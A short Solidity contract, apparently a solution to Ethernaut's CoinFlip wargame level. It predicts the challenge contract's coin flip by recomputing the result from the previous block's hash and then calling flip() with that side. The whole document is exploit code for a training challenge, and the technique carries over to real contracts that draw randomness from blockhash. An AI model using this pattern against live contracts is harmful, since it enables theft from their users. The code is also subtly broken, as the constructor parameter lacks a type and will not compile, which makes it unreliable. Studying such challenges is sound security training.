pragma solidity ^0.8.0;

import "./coinflip.sol"; // importing Ethernaut's challenge source code

contract CoinflipExploit {
    CoinFlip public coinflip;
    uint FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(coinflipAddress) {
        coinflip = CoinFlip(coinflipAddress); // creating the interface with the challenge
    }

    function flipGuess() public {
        // running the same code as the challenge contract to get the same side
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // flipping with the same side as the challenge contract
        coinflip.flip(side);
    }
}
